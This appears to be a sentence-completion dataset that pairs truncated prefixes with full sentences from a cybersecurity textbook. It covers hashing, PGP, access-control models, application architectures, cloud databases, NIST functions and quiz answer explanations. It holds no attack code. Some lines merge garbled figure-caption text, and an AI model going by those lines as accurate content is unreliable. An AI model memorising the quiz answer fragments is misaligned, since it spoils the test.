"this states that in a room of 23 people , there is a 50","this states that in a room of 23 people , there is a 50 percent chance that two people share the same birth-day ( month and day )"
the graph of the probability has a steep ramp early,the graph of the probability has a steep ramp early on but then essentially trails along the top for a while
it ’ s this probability game of being able to,it ’ s this probability game of being able to generate a collision in hash values that becomes the attack vector
a single bit difference in two sets of input generates,a single bit difference in two sets of input generates two sets of output that have no relation to one another
"if it isn ’ t considered authentic , it should be","if it isn ’ t considered authentic , it should be discarded because the assump-tion is that it has been tampered with"
once an attacker can manipulate the message and still have the digest come,"once an attacker can manipulate the message and still have the digest come out right , they can change encrypted messages that are believed to be private"
"currently , there is sha-2 , which supports four differ- ent","currently , there is sha-2 , which supports four differ- ent digest sizes , or bit lengths , that the algorithm can generate"
"since sha-2 has digest lengths up to 512 bits , there isn ’","since sha-2 has digest lengths up to 512 bits , there isn ’ t really any reason not to use it rather than sha-1 and cer-tainly md5"
"in addition to providing message authentication , cryptographic","in addition to providing message authentication , cryptographic hashes are used to verify data as being correct"
"when the file is downloaded , a hash can be computed","when the file is downloaded , a hash can be computed on what was downloaded and compared to what it should be"
"in this case , it doesn ’ t protect against authenticity of the file","in this case , it doesn ’ t protect against authenticity of the file , meaning there isn ’ t much of a chance of tampering during the download"
"this is not to say that there aren ’ t cases where the underlying file may have been swapped , and you should","this is not to say that there aren ’ t cases where the underlying file may have been swapped , and you should make sure that what is expected to be available through a website for download is actually the file that is available for down-load"
the software then goes through periodically to compare what is on,the software then goes through periodically to compare what is on the file system to what is in the known good database
host-based intrusion detection systems will often use elements like this to,host-based intrusion detection systems will often use elements like this to be able to detect when an attacker gains access to a system
"in the 1990s , phil zimmerman developed another way of","in the 1990s , phil zimmerman developed another way of man-aging certificates that does not use a ca for centralized verification"
someone who knows the person who has uploaded their key will sign that key as a demonstration that they,someone who knows the person who has uploaded their key will sign that key as a demonstration that they know the person and are willing to say that key really belongs to the user it purports to belong to
"you trust me and i trust that franny ’ s key is legitimate , so you can trust","you trust me and i trust that franny ’ s key is legitimate , so you can trust that franny ’ s key is legitimate and you can send encrypted messages to her using her public key"
this keyring would typically be signed with your key and also stored with a,this keyring would typically be signed with your key and also stored with a message authentication code so you can be sure it hasn ’ t been tampered with
"as you have likely seen often by now , when you are talking about encryption and","as you have likely seen often by now , when you are talking about encryption and privacy , ensuring the validity of every aspect of the process and protecting the keys are important"
how would you know which one you should be using to encrypt a message,how would you know which one you should be using to encrypt a message ? it puts all of the management into the hands of the individual user
the user has to know who they want to send mes-sages to,the user has to know who they want to send mes-sages to and which key to use that would be correct for that user
pgp can be used to encrypt an email message that is sent from,"pgp can be used to encrypt an email message that is sent from one user to another , as long as they are running pgp software"
this is a standard that is generally implemented in mail,"this is a standard that is generally implemented in mail clients , meaning there is no need for third-party software"
"in a fully microsoft environment , users within an enterprise can send encrypted messages","in a fully microsoft environment , users within an enterprise can send encrypted messages to one another and public keys can be retrieved from the active directory server"
this means there is no need to have other root ca keys in the,this means there is no need to have other root ca keys in the sys-tem or require any other methods to get the public key onto the client system
"if they can intercept messages that are not encrypted , they","if they can intercept messages that are not encrypted , they may be able to make use of the contents of the mes-sage"
users will sometimes make the mistake of believing that messages sent to,users will sometimes make the mistake of believing that messages sent to other users within an enterprise are safe because they remain inside the enterprise
"this means if an attacker can gain authenticated access , even by introducing malware that","this means if an attacker can gain authenticated access , even by introducing malware that is run as the primary user , the disk is wide open to the attacker"
"this is where the unencrypted message , or plain text , is not replaced a","this is where the unencrypted message , or plain text , is not replaced a character at a time but the entire message is transformed , generally through a mathemati-cal process"
"using a common starting point , both parties in the","using a common starting point , both parties in the process add a value and pass it to the other party"
"once the value has been added to the shared key , you end up with both sides","once the value has been added to the shared key , you end up with both sides having the common value plus the random value from side a plus the random value from side b"
"this process could be used for symmetric keys , where","this process could be used for symmetric keys , where the same key is used for both encryption and decryption"
you might also use an asymmetric key algorithm,you might also use an asymmetric key algorithm where different keys are used for encryption and decryption
a common approach is to use a hybrid cryptosystem where public key cryptography is used to,"a common approach is to use a hybrid cryptosystem where public key cryptography is used to share a session key , which is a symmetric key used to encrypt messages within the session"
this includes information about the identity of the,this includes information about the identity of the certifi-cate holder so verification of the certificate can happen
"certificates may be managed using a ca , which is a","certificates may be managed using a ca , which is a trusted third party that verifies the identity of the certificate holder"
"pgp uses a web of trust model , where indi-vidual users","pgp uses a web of trust model , where indi-vidual users validate identity by signing the public keys of people they know"
"this is generally a cryp- tographic hash , which is","this is generally a cryp- tographic hash , which is an algorithm that generates a fixed-length digest value from variable-length data"
this can be used not only for message authentication but also,this can be used not only for message authentication but also for veri-fying that files have not been tampered with or corrupted
what principle is used to demonstrate that a signed message came,what principle is used to demonstrate that a signed message came from the owner of the key that signed it ? a
"no matter what you are developing or imple- menting , it ’ s important to","no matter what you are developing or imple- menting , it ’ s important to consider users and , perhaps more important , data classifications and their necessary security requirements"
there are several ways of approaching the design of security models,"there are several ways of approaching the design of security models , and some of them relate to how data is classified"
"there are different ways to implement applications today , espe-cially as we move","there are different ways to implement applications today , espe-cially as we move further away from a straight native application deployed on a single client system"
"additionally , there are security architectures to consider","additionally , there are security architectures to consider when it comes to application development and deployment"
developing a security architecture means using a top-down approach to ensuring that,"developing a security architecture means using a top-down approach to ensuring that security policies , standards , and controls are all consistent and coherent"
security policy starts at the top of the organization,"security policy starts at the top of the organization , setting the direction based on business needs and requirements"
data classification is used to identify and,data classification is used to identify and organize information that has similar security control needs
"when you start thinking about security models , it is important to consider your data classifications","when you start thinking about security models , it is important to consider your data classifications , because security models are used to help identify who gets to look at what data"
different organizations will use different types of classification,"different organizations will use different types of classification schemes , depending on the data resources in place"
this is also something you will hear a lot when,this is also something you will hear a lot when it comes to the government and perhaps especially the military
1 governmental data classifications classification description top,1 governmental data classifications classification description top secret the highest level of data classification
official this is information that relates to government business and may not be,official this is information that relates to government business and may not be an indicator of the potential for harm if the information were lost or exposed
this may include declassified information that was once considered a,this may include declassified information that was once considered a higher classification but the threat posed by its exposure has subsided
top secret information is not necessarily available to everyone,top secret information is not necessarily available to everyone who has been cleared at a top secret level
2 simple data classification classification description,2 simple data classification classification description restricted data that is internal or sensitive
"private data that may also be internal or sensitive , but the loss","private data that may also be internal or sensitive , but the loss or disclosure of this data would cause only moderate damage to an organization"
public data that is classified public would incur no,public data that is classified public would incur no damage to an organization if it were disclosed or lost
it may also depend on the people who exist within,it may also depend on the people who exist within an organization as to how many levels of classification you need
"if you have a small organization and everyone is essentially equal , such as a startup that","if you have a small organization and everyone is essentially equal , such as a startup that consists of only part-ners in the company , perhaps you only need to have two data classification levels"
"as with so many things , it ’ s quite a","as with so many things , it ’ s quite a bit easier to perform classification early in the life of an organi-zation"
larger organizations with a considerable amount of data will find it much harder,larger organizations with a considerable amount of data will find it much harder to perform classification simply because of the volume and scale of the data
people who should have access to public data,people who should have access to public data generally shouldn ’ t have access to sensitive information
someone who has access to top secret data should have,someone who has access to top secret data should have access to public data but definitely not the other way around
these are the sorts of relationships that are,these are the sorts of relationships that are defined in the mod-els presented in the following sections
this should include the actions that would be possible to move a,this should include the actions that would be possible to move a system into a par - ticular state and all the possible state transitions
when a system makes a transition that is unexpected or an action,"when a system makes a transition that is unexpected or an action results in an unexpected state , this can be monitored and alerted"
this model is far more abstract than the others discussed,this model is far more abstract than the others discussed here since it doesn ’ t actually define any expected behaviors
it ’ s simply a way to model an,"it ’ s simply a way to model an environment , requiring that someone define expected behaviors and states"
data that has been altered unexpectedly or by the,data that has been altered unexpectedly or by the wrong people can also be damaging to an organization
there are three objectives when it comes to ensur-ing,there are three objectives when it comes to ensur-ing data integrity : ✓■unauthorized parties can not modify data
the first objective is about ensuring that someone from the outside,the first objective is about ensuring that someone from the outside who doesn ’ t have access can ’ t modify data
the second is about someone from the inside not being able to modify data,the second is about someone from the inside not being able to modify data they shouldn ’ t be modifying or perhaps shouldn ’ t even be seeing
"in the biba integrity model , data has","in the biba integrity model , data has classification levels but people also have clas- sification levels"
the biba model defines three sets of rules : ✓■the simple identity property says a subject,the biba model defines three sets of rules : ✓■the simple identity property says a subject at one level of integrity may not read a data object at a lower integrity level
✓■the * ( star ) identity property says a subject at one level,✓■the * ( star ) identity property says a subject at one level of integrity may not write to data objects at a higher level of integrity
"like biba , it is a state machine model , meaning that","like biba , it is a state machine model , meaning that subjects and objects exist in a single state at a point in time"
bell-lapadula also identifies a secure state so all transitions,bell-lapadula also identifies a secure state so all transitions should move from one secure state to another secure state
only appropriate levels of access are allowed within this,only appropriate levels of access are allowed within this model because they are defined and can be evaluated
"as a result , the model defines properties that are","as a result , the model defines properties that are different from those that were defined in the biba model"
the bell-lapadula properties are defined as follows : ✓■the simple security property says that a,the bell-lapadula properties are defined as follows : ✓■the simple security property says that a subject at one security level may not read an object at a higher security level
✓■the * ( star ) property says that a subject at one,✓■the * ( star ) property says that a subject at one security level may not write to an object at a lower security level
bell-lapadula provides for two mandatory access control rules ( simple security,bell-lapadula provides for two mandatory access control rules ( simple security property and * property ) and a single discretionary access control rule
discretionary access control allows users to set their own access,discretionary access control allows users to set their own access rules based on their needs and the data they control
"with discretionary access control , the enterprise doesn ’ t","with discretionary access control , the enterprise doesn ’ t have control over what subjects are allowed to access objects"
clark-wilson integrity model the clark-wilson model is another,clark-wilson integrity model the clark-wilson model is another one that focuses on integrity rather than confidential-ity
"this doesn ’ t mean , though , that it is the same as","this doesn ’ t mean , though , that it is the same as the biba model , even if the end result is intended to be the same"
"rather than a state machine , where a subject would act on an object directly","rather than a state machine , where a subject would act on an object directly , clark-wilson expects that subjects act on data objects only through the use of programs"
"also , where biba is used to protect information at higher levels of","also , where biba is used to protect information at higher levels of classification , clark-wilson is used and is applicable across all levels of data classification"
the overall objective of clark-wilson is to maintain the consistency of the data as it moves from one,"the overall objective of clark-wilson is to maintain the consistency of the data as it moves from one state to another , meaning every transaction leaves the object in a state that makes sense and is usable"
"rather than defining a state machine , as noted , clark-wilson defines","rather than defining a state machine , as noted , clark-wilson defines data items and only allows access through a small number of known programs"
if any subject other than those allowed attempt to access the object,"if any subject other than those allowed attempt to access the object , even through the known program/transaction , it ’ s a violation"
the same is true for attempt-ing transactions that,the same is true for attempt-ing transactions that are not defined by attempting to use other programs
"these are handled by transformation procedures ( tps ) , and the validity of the","these are handled by transformation procedures ( tps ) , and the validity of the data in a certain state is checked by an integrity verification procedure ( ivp )"
"additionally , there are rules for ensuring that there is logging and also for","additionally , there are rules for ensuring that there is logging and also for new data entering a system , specifying that it does not need to be constrained"
"finally , there is a rule making sure that only","finally , there is a rule making sure that only the certifier of a tp can change qualifications of the tp"
this goes back to the main-frame days when users,this goes back to the main-frame days when users would connect to the mainframe and run their programs there
"everything related to the program , including any data requirements","everything related to the program , including any data requirements the program may have had , existed on a single system"
there were controls in place on that system to pre-vent unauthorized access,"there were controls in place on that system to pre-vent unauthorized access , especially since there was a single point of entry to that system"
"following along to the days of the personal computer , before","following along to the days of the personal computer , before they were attached to net-works , programs ran on a single system"
"cloud-based providers , where systems reside at the service provider ’ s premises","cloud-based providers , where systems reside at the service provider ’ s premises and are consumed virtually , are starting to change how applications can be architected"
a service-oriented architecture takes the idea of a,a service-oriented architecture takes the idea of a monolithic design by breaking out components into services
"in some cases , you may see a version of this referred to as the model-view-controller","in some cases , you may see a version of this referred to as the model-view-controller ( mvc ) design , even if there may be other elements in those multiple tiers"
these tiers are also referred to as the presentation,"these tiers are also referred to as the presentation , application , business , and data access layers"
"the presentation layer , which is the same as the view ,","the presentation layer , which is the same as the view , is at the client , where the laptop is in the figure"
"in essence , the application layer makes determinations as to which","in essence , the application layer makes determinations as to which rules should be applicable and calls the appropriate business logic rules"
the business logic rules are provided by the needs of the business,the business logic rules are provided by the needs of the business and indicate how the application should process data that is provided to it
"the application layer , or the application and business logic layers","the application layer , or the application and business logic layers , are equivalent to the controller layer in the mvc design"
web requests are sent into the appli-cation server and from there are,"web requests are sent into the appli-cation server and from there are vectored into the application code as necessary , based on the request"
net languages like visual basic and c # are handled in an application,"net languages like visual basic and c # are handled in an application server , which comes with microsoft ’ s internet information server ( iis )"
"a relational database helps with the data model , since this","a relational database helps with the data model , since this type of database is about defining relationships between the different data objects"
"this definition , or schema , is a way of","this definition , or schema , is a way of providing some visualization to the data model for the application"
the structured query language ( sql ) is used to create the database,the structured query language ( sql ) is used to create the database and its component tables as well as add data and retrieve the data
these columns describe the components of the table and all,these columns describe the components of the table and all the rows are the instances of data in the table
this is called an entity-relation-ship diagram that shows,this is called an entity-relation-ship diagram that shows the relationship between the tables in the database
4 entity-relationship diagram visittable buapf id char dtvisitdate date id_1 integer pettable +u adpf id char strname char strsex charstrbreed charproceduretable uuuap id integer id_1,4 entity-relationship diagram visittable buapf id char dtvisitdate date id_1 integer pettable +u adpf id char strname char strsex charstrbreed charproceduretable uuuap id integer id_1 char id_2 char these relationships keep associated data mapped together without having to have a single enormous database table with a lot of repeated data
this entity-relationship diagram is a way of thinking about the model,"this entity-relationship diagram is a way of thinking about the model , and its implementation is the data layer of the multitier architecture"
rather than thinking about applications from end to end ( user to data,"rather than thinking about applications from end to end ( user to data store ) , it looks at the different functions needed to make applications function"
the architecture of the application is the connection between the different services as a,the architecture of the application is the connection between the different services as a way of implementing all the features required by the end user or the application con-sumer
"they may use communica- tions protocols like remote method invocation ( rmi ) ,","they may use communica- tions protocols like remote method invocation ( rmi ) , remote procedure call ( rpc ) , or even representation state transfer ( rest )"
these existing communications protocols mean the programmer doesn ’ t need,these existing communications protocols mean the programmer doesn ’ t need to create their own protocols to communicate from one ser-vice to another
the services make use of these protocols to communicate to other services through,the services make use of these protocols to communicate to other services through the use of libraries rather than needing to create entirely new communications methods
another advantage of service-oriented architectures is that once you abstract functions to services and allow the communication to happen outside,"another advantage of service-oriented architectures is that once you abstract functions to services and allow the communication to happen outside of just calling a function within the same process space as the calling function , you can place that service anywhere"
there may be nothing in that memory space or even that system other than ephemeral data that isn,"there may be nothing in that memory space or even that system other than ephemeral data that isn ’ t even complete , depending on the implementation of the services and the overall design of the application"
"it does , though , mean that often services are exposed externally","it does , though , mean that often services are exposed externally , so an attacker could probe from one service and system to another"
"it ’ s often just as easy to use a web interface , and it ’ s certainly","it ’ s often just as easy to use a web interface , and it ’ s certainly often easier for users to consume a web interface rather than needing to install native-code applications to a system"
beneath the dividing line is a collection of services,beneath the dividing line is a collection of services that could be consumed by any component of the application
"these may include a login service , a user management service , a","these may include a login service , a user management service , a user profile service , a data modeling service , and a storage service"
"this means the application is really modular , which","this means the application is really modular , which has long been consid-ered a good approach to software design"
the kernel prevents any application from accessing the memory space,the kernel prevents any application from accessing the memory space or trying inter-process communication with an application from another namespace
5 service-oriented architecture web interface statistical service data modeling serviceuser management service user proﬁle service storage serviceweb application architecture login service xxxxxxxxx xxxxxxxx unlike a virtual,"5 service-oriented architecture web interface statistical service data modeling serviceuser management service user proﬁle service storage serviceweb application architecture login service xxxxxxxxx xxxxxxxx unlike a virtual machine , which is a full operating system running on top of another operating system , a container uses the same kernel as the host operating system"
the only thing that exists in the container is the application and any,the only thing that exists in the container is the application and any library dependencies that are neces-sary for the application or service to function correctly
"the container will also get its own network interface , so it does","the container will also get its own network interface , so it does appear to other systems as though it ’ s a separate device altogether"
while it ’ s technically still possible to run a virtual machine inside another virtual,"while it ’ s technically still possible to run a virtual machine inside another virtual machine , there is overhead from the multiple layers of abstraction of interrupts and memory devirtualization"
"there is no longer a need to stand up completely differ- ent systems , virtual or physical","there is no longer a need to stand up completely differ- ent systems , virtual or physical , when all you need to do is create containers for the differ-ent services a complete application comprises"
"cloud-based applications in essence , using cloud computing","cloud-based applications in essence , using cloud computing providers is just another way of outsourcing infrastruc-ture"
"you can deploy a traditional mul-titier application at a cloud provider , and you would get a","you can deploy a traditional mul-titier application at a cloud provider , and you would get a transference of the risk that may come from exposing a network-based application to attackers in the outside world"
this exposure could allow an attacker to gain access to,this exposure could allow an attacker to gain access to that application and then pivot to other systems within the enterprise
"for a start , cloud providers like microsoft , amazon ,","for a start , cloud providers like microsoft , amazon , and google allow for the creation of containers to deploy applications to"
"there are log services , log watch services , and services to create a","there are log services , log watch services , and services to create a trail of events that can be useful in the case of the application being compromised"
the event logs and available audit trails will be important for,the event logs and available audit trails will be important for an investiga-tion to determine point of entry and extent of compromise
"additionally , providers like aws will handle all identity and access management , mak- ing them","additionally , providers like aws will handle all identity and access management , mak- ing them considerably more capable than smaller organizations that don ’ t have as many services at their disposal"
"above and beyond what aws offers natively , which is substantial","above and beyond what aws offers natively , which is substantial , many vendors also offer their own services as aws instances"
"the services may include uni-fied threat management appliances , firewalls ,","the services may include uni-fied threat management appliances , firewalls , intrusion detection systems , and many other types of security devices"
"rather than hardware appliances , these are all virtual","rather than hardware appliances , these are all virtual instances running the same software as a hardware device would"
this is a service offered by aws that an application developer can use,this is a service offered by aws that an application developer can use to create a function that has no server or container associated with it
"if , by chance , one of the functions has a vulnerability and it","if , by chance , one of the functions has a vulnerability and it could be compromised , there is no server on the back-end to take advantage of"
this provides the means to access functions that are provided,this provides the means to access functions that are provided by the lambda services you can see in the middle
"on the backend , there is a nosql","on the backend , there is a nosql database for application storage , including user-based state information"
this may include storage on the client side using a,this may include storage on the client side using a virtual connection from the application network to the client network
"however , there are also multiple ways to do","however , there are also multiple ways to do fi le-based storage or databases with cloud service providers"
"not only does it have its own enterprise-grade database , it","not only does it have its own enterprise-grade database , it also acquired mysql several years ago , a popular open-source database server"
microsoft ’ s sql server is also a very common database server,"microsoft ’ s sql server is also a very common database server , particularly in organizations that are already heavily invested in microsoft infrastructure"
"no matter which sql server you are using , it is actually","no matter which sql server you are using , it is actually a server , meaning it is a service that runs , accepting connections"
"the connections can be over the local network ,","the connections can be over the local network , meaning there is an open port that listens for requests"
"mysql will not operate using udp , though microsoft ’ s sql","mysql will not operate using udp , though microsoft ’ s sql server can be confi g-ured to use udp for connections from clients"
listening services are problematic on the network because,listening services are problematic on the network because there is the possibility of an unauthorized client connecting
strong authentication credentials are especially essen tial in cases where the connection has,strong authentication credentials are especially essen tial in cases where the connection has to be over the network because the client is on a separate server
this is a type of interprocess communication where,this is a type of interprocess communication where there is no port listening for network connections
sql injection attacks are accomplished by injecting sql into,"sql injection attacks are accomplished by injecting sql into a web form , which may require some obfuscation"
if an attacker can gain direct net-work access to the database,"if an attacker can gain direct net-work access to the database server , they won ’ t need to manipulate the query"
"if the attacker can get authenticated access , they can","if the attacker can get authenticated access , they can just issue que-ries and obtain the contents of the database"
"while relational database servers have been common for decades ,","while relational database servers have been common for decades , other database sys- tems are starting to become more common"
here you can see how you might handle some personal information using json,"here you can see how you might handle some personal information using json , which may be used to store or at least represent some nosql data"
"person representation in js on '' person '' : { `` firstname '' : `` ric '' , `` lastname '' : `` messier '' , `` sex ''","person representation in js on '' person '' : { `` firstname '' : `` ric '' , `` lastname '' : `` messier '' , `` sex '' : `` male '' , `` age '' : `` old '' , `` state '' : `` co '' } } with json , you can embed complex datatypes"
"with a key-value database , you aren ’ t necessarily restricted to interacting with a single table at a time","with a key-value database , you aren ’ t necessarily restricted to interacting with a single table at a time , and you can also make use of complex datatypes without having to do complex join queries of a relational database"
"another type of database that may be used is a graph database ,","another type of database that may be used is a graph database , which is a highly connected datastore where the connections are represented using graphs"
you can see a par - tial list of the,you can see a par - tial list of the nosql database providers that are available in azure in figure 14
mongodb needs to be configured to listen on a,"mongodb needs to be configured to listen on a network interface , which may be just the local interface"
knowing the type of database an enterprise or,knowing the type of database an enterprise or application is using may be insufficient to gaining access
8 nosql database offerings with azure not all databases are,8 nosql database offerings with azure not all databases are managed by separate pieces of software like a database server
"as it ’ s a sql-based relational database ,","as it ’ s a sql-based relational database , all programmatic access is still handled using sql queries"
"when some people hear security architecture , they may think about the network","when some people hear security architecture , they may think about the network design and all the security elements that would be placed into the network"
a security architecture should start at the very top,a security architecture should start at the very top of an organization so goals and business objectives are identified
this ensures that all security functions within the,this ensures that all security functions within the organization are designed and implemented to support busi-ness goals
"an architecture should identify the analysis , design","an architecture should identify the analysis , design , planning , and implementa-tion of security functions"
this was a result of a general lack of understanding of the value,this was a result of a general lack of understanding of the value and functionality of secu-rity and its importance to the organization as a whole
"in the absence of business-generated goals , the goals of the security organization were developed from the","in the absence of business-generated goals , the goals of the security organization were developed from the bottom up , which means the technical needs may have been put in front of anything else"
"as data breaches have become far more prevalent over time , businesses have started to recognize the need","as data breaches have become far more prevalent over time , businesses have started to recognize the need to take security on as a function of not only executive management but also the board of directors"
"to achieve this top-down defined security architecture , the business should take","to achieve this top-down defined security architecture , the business should take advan- tage of any business road maps or long-term planning already in place"
"they should also make use of trends , whether they are industry trends or intelligence related","they should also make use of trends , whether they are industry trends or intelligence related to threats that may be specific to the business or the vertical industry the business belongs to"
risk is the probability of the actualization of loss,risk is the probability of the actualization of loss or damage resulting from the exploit of a vulnerabil-ity
"businesses may have different perspectives on risk , based on how","businesses may have different perspectives on risk , based on how they have identified threats or quantified loss or probability of that loss"
"overall , the business needs to manage risks to the business ,","overall , the business needs to manage risks to the business , and businesses have become more aware of risks associated with their information resources"
once a business has a handle on risk identification and management as well as the planning that would,"once a business has a handle on risk identification and management as well as the planning that would go into risk management , it would be able to generate requirements that should go into a security architecture"
the national institute of standards and technology ( nist ) has a cybersecurity framework that,the national institute of standards and technology ( nist ) has a cybersecurity framework that has been identified to highlight phases in which a business should consider implementing security controls
"nist refers to these as the five functions ,","nist refers to these as the five functions , and they are the core of the nist cybersecurity framework"
9 nist ’ s five functions identify protect detectrespondrecover a security control is,"9 nist ’ s five functions identify protect detectrespondrecover a security control is a means of avoiding , detecting , counteracting , or mini- mizing security risk"
since we are talking about security at a business level,"since we are talking about security at a business level , these fi ve functions refer to risks to the business"
"the identify function , for instance , is about identifying risk to the business ,","the identify function , for instance , is about identifying risk to the business , identifying assets , identifying policies used for governance , and identifying a risk manage-ment strategy"
these actions should be guided by the business to ensure that security,these actions should be guided by the business to ensure that security and the business are aligned in a mutual understanding of the goals
the protect function can ’ t be executed without identifying,the protect function can ’ t be executed without identifying all of the business assets and their importance to the organization
"this function is about protecting business assets overall , which","this function is about protecting business assets overall , which means there should be capabilities for maintaining software or appliances"
it also includes making sure there is an identity and access management,it also includes making sure there is an identity and access management function to ensure that only authorized users gain access to business resources
business resources include physical resources like buildings and any areas within,"business resources include physical resources like buildings and any areas within the building that may house business-critical assets , infor-mational or otherwise"
"if an event is detected , it can be assessed for veracity as well as impact and then prioritized","if an event is detected , it can be assessed for veracity as well as impact and then prioritized based on those pieces of information ( as well as any others the business decides are necessary for prioritization )"
if the event does pose a potential risk ( measurable probability of loss or damage ),"if the event does pose a potential risk ( measurable probability of loss or damage ) , it would be classified as an incident , which would call the response function into action"
the response function is about isolating the incident,the response function is about isolating the incident and applying mitigation steps to resolve the incident
businesses need to have a response function that will have plans in,businesses need to have a response function that will have plans in place for different contingencies so they are ready if something were to happen
"this function would also require the need to commu-nicate with stakeholders , which would","this function would also require the need to commu-nicate with stakeholders , which would include internal stakeholders as well as , potentially , law enforcement or other external entities"
this may include the capability to hold after-action reviews to collect lessons,this may include the capability to hold after-action reviews to collect lessons learned and then implement those lessons learned to continue to improve business practices
"there should always be feedback loops , where one function","there should always be feedback loops , where one function informs another so all functions continue to improve over time"
it may be especially true when you consider all of the security,it may be especially true when you consider all of the security controls that are necessary to be implemented to cover all five functions
nist ’ s special publication 800-53 is a catalog of,nist ’ s special publication 800-53 is a catalog of security controls nist recommends for use in the federal government
they can be used to guide implementation of a secu-rity architecture,they can be used to guide implementation of a secu-rity architecture whose goal is to provide support and protection to the business
nist is not the only player in the space of,nist is not the only player in the space of providing guidance that can be useful in creating a security architecture
it publishes guidance for information security management systems that is,it publishes guidance for information security management systems that is called iso 27001 ( sometimes referred to as iso/iec 27001 )
"these are all pretty self-explanatory , except perhaps act , which is about addressing anything that may come","these are all pretty self-explanatory , except perhaps act , which is about addressing anything that may come out of the check phase , which could include implementing preventive or corrective actions result-ing from an audit"
one last way to think about implementing information,one last way to think about implementing information security controls is through the attack life cycle
the attack life cycle is thought to be the set,the attack life cycle is thought to be the set of steps an attacker would take to compromise your organization
an event indicating initial recon would be far less severe,an event indicating initial recon would be far less severe than an event indicating data exfiltration ( mission complete )
10 attack life cycle complete missionescalate privilegesinitial recon initial compromiseestablish footholdinternal reconmaintain presencemove laterally businesses looking to implement,10 attack life cycle complete missionescalate privilegesinitial recon initial compromiseestablish footholdinternal reconmaintain presencemove laterally businesses looking to implement a security architecture may consider implementing con- trols to address each of the phases in the attack life cycle
"since the most important actions come later in the attack life cycle ,","since the most important actions come later in the attack life cycle , it ’ s important to be able to manage anything happening there as well"
"you would be unable to implement biba , for instance , if you didn ’ t know","you would be unable to implement biba , for instance , if you didn ’ t know sensitivity or priority , since biba needs to know who can read up and who can write down"
"other models , like the bell-lapadula model , aren ’","other models , like the bell-lapadula model , aren ’ t as concerned with integrity as they are with confidentiality"
native applications that are stand-alone have no,native applications that are stand-alone have no external architecture but may have an internal architecture
"the multitier architecture is composed of the presentation ,","the multitier architecture is composed of the presentation , application , business logic , and data access layers"
"finally , there is probably a data store , perhaps in the form","finally , there is probably a data store , perhaps in the form of a database , that is the data access layer ( model )"
"modern applications are still using multitier architectures , but they","modern applications are still using multitier architectures , but they are also often bro- ken up into functions or services"
"when an application is viewed or designed this way ,","when an application is viewed or designed this way , it is said to have a service-oriented architecture ( soa )"
this means the overall application is broken up,this means the overall application is broken up into services and the services interact with one another
it provides modularity so any service can be replaced with another service,it provides modularity so any service can be replaced with another service with the same input/output specifica-tions without altering the rest of the application
"traditional application architectures can also be implemented using a cloud provider , and you could end up with a","traditional application architectures can also be implemented using a cloud provider , and you could end up with a hybrid approach where pieces of your application are on your premises while others are implemented using a cloud provider"
cloud providers are also beginning to expose application,cloud providers are also beginning to expose application developers to new ways of considering their application design
"the functions are connected in order to create the overall application ,","the functions are connected in order to create the overall application , but there is no server underneath that an attacker could gain access to"
"similarly , the use of containers has sometimes led to automated infra-structure ,","similarly , the use of containers has sometimes led to automated infra-structure , so containers and virtual machines are built up and torn down on demand"
an attacker who gained access to such an environment might have to keep starting over when the system they,"an attacker who gained access to such an environment might have to keep starting over when the system they had access to suddenly went away , including any files that had been put in place by the attacker"
modern applications are moving away from this approach and starting to use,"modern applications are moving away from this approach and starting to use nosql databases , which may use semi-structured documents or key-value associative arrays"
"instead , it is a set of data and meth-odologies","instead , it is a set of data and meth-odologies that guide the overall implementation of security within the organization"
"nist recommends the five functions of identify , protect , detect , respond , and recover as a way of guiding","nist recommends the five functions of identify , protect , detect , respond , and recover as a way of guiding the organization—organizationally for staffing , but also in terms of how they evaluate information security and any potential risks to the business"
there is also the attack life cycle that identifies phases an,there is also the attack life cycle that identifies phases an adversary works through to gain access to critical business systems or data
"these are initial recon , initial compromise , establish foothold , escalate privileges","these are initial recon , initial compromise , establish foothold , escalate privileges , internal recon , move laterally , maintain persistence , and complete mission"
what type of application virtualization would you use without,what type of application virtualization would you use without going all the way to using a hypervisor ? a
the only device here that is a general-purpose computing platform with a traditional user,"the only device here that is a general-purpose computing platform with a traditional user interface—screen and keyboard—is the smartphone , so it isn ’ t part of the iot"
while microsoft azure and google compute have storage capabilities,"while microsoft azure and google compute have storage capabilities , they aren ’ t storage as a service solutions"
the only one listed here that is storage as a solution,"the only one listed here that is storage as a solution is icloud , which is apple ’ s cloud storage platform"
while icmp may be used as part of passing control messages in case of errors in,"while icmp may be used as part of passing control messages in case of errors in the network , it wouldn ’ t be used between the iot device and a server"
an enterprise would use multiple switches that were all connected to one another over a,"an enterprise would use multiple switches that were all connected to one another over a bus , while all the endpoints would connect to the switch in a star topology"
"ieee is the institute for electrical and electronics engineers ,","ieee is the institute for electrical and electronics engineers , which does manage some protocols but isn ’ t documentation itself"
the best place to find definitive documentation about protocols seen on,the best place to find definitive documentation about protocols seen on the internet is in the request for comments ( rfc ) documents
the source address is used as the address to send,"the source address is used as the address to send back to on the response , making it the destination address"
the ip identification field is used to identify fragments of the same,"the ip identification field is used to identify fragments of the same packet , as they would all have the same ip identification number"
"on windows systems , tracert uses icmp echo request","on windows systems , tracert uses icmp echo request messages , also incrementing the time to live value"
packet filters are used to make block/allow decisions based,packet filters are used to make block/allow decisions based on header data like source and destination address and port
stateful firewalls add in the ability to factor in,"stateful firewalls add in the ability to factor in the state of the connection—new , related , established"
a unified threat management appliance adds additional capabilities,"a unified threat management appliance adds additional capabilities on top of firewall functions , including antivirus"
non-repudiation makes sure someone can ’ t say a message didn,non-repudiation makes sure someone can ’ t say a message didn ’ t originate with them if it came from their identity
switches and optical cable connections can certainly be part of a network design,"switches and optical cable connections can certainly be part of a network design , but in and of themselves they don ’ t add any security features"
"you may use linux on the desktop , but without more of a strategy","you may use linux on the desktop , but without more of a strategy for patch and vulnerability management , linux is no better than other operating systems"
access control lists on routers can add an additional layer of security,"access control lists on routers can add an additional layer of security , especially when combined with other elements like firewalls and intrusion detection systems"
"confidentiality is keeping secret information secret , which","confidentiality is keeping secret information secret , which means unauthorized users can ’ t access it"
encryption is a good way to keep unauthorized users from data because in,"encryption is a good way to keep unauthorized users from data because in order to get to the data , they need to have the key"
firewalls are used to block traffic into a network,"firewalls are used to block traffic into a network , though an intrusion prevention system will also block traffic"
"a packet filtering firewall uses header information , such as source and destination","a packet filtering firewall uses header information , such as source and destination address and port , to determine whether to allow traffic into the network"
"if a user makes a change to a file and saves it , that","if a user makes a change to a file and saves it , that ’ s an intentional act and the data is what the user expects and wants"
"if the disk drive has flagged bad blocks on the disk , the drive won ’","if the disk drive has flagged bad blocks on the disk , the drive won ’ t write any data out to those blocks , so there will be no loss of integrity"
"memory failures , though , could cause a loss of data","memory failures , though , could cause a loss of data integrity , even in the case of writing data to the drive"
